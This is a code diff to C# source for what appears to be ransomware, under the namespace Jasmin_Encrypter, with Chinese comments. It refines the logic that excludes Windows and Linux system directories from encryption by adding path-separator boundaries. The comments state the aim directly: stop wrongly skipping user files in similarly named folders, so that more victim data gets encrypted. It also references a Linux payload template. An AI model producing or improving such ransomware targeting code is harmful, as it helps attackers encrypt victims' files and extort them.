@@ -75,9 +75,14 @@ namespace Jasmin_Encrypter
             // 系统目录
             string root = Path.GetPathRoot(full) ?? @"C:\";
             foreach (var d in WinDirs)
-                if (full.StartsWith(root + d.TrimStart('\\'),
-                    StringComparison.OrdinalIgnoreCase))
+            {
+                // 前缀必须带路径分隔符边界：否则 root+"Windows" 会匹配
+                // "C:\WindowsApps\..."、"C:\WindowsSystem32Backup\..." 等
+                // 开头巧合相同的目录，误跳用户文件。
+                string p = (root + d.TrimStart('\\').TrimEnd('\\')) + "\\";
+                if (full.StartsWith(p, StringComparison.OrdinalIgnoreCase))
                     return true;
+            }
 
             // 系统扩展名
             if (WinExts.Contains(ext)) return true;
@@ -95,8 +100,13 @@ namespace Jasmin_Encrypter
         static bool CheckLin(string full, string name)
         {
             foreach (var d in LinDirs)
-                if (full.StartsWith(d, StringComparison.Ordinal))
+            {
+                // /boot 不应匹配 /bootleg、/bin 不应匹配 /binary
+                // （linux_payload.tpl 的 skip() 早已按 d+'/' 判断）
+                string p = d.TrimEnd('/');
+                if (full == p || full.StartsWith(p + "/", StringComparison.Ordinal))
                     return true;
+            }
 
             if (LinFiles.Contains(name)) return true;
 
